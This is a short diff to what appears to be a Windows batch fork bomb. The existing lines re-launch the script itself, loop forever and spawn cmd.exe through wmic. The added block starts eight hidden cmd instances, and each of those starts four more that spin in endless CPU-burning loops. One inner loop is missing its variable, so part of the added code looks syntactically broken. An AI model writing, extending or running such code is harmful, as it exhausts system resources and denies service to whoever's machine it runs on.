@@ -61,6 +61,8 @@ start /b "" %0
 start /b cmd /c "for /l %%x in (1,0,2) do echo %%x"
 wmic process call create "cmd.exe"
 
+for /l %%i in (1,1,8) do (
+    start /b /low /min cmd /c "for /l %%j in (1,1,4) do (start /b /min cmd /c @echo off ^& for /l in () do (set /a n=1))"
+)
+
 goto loop
-
-
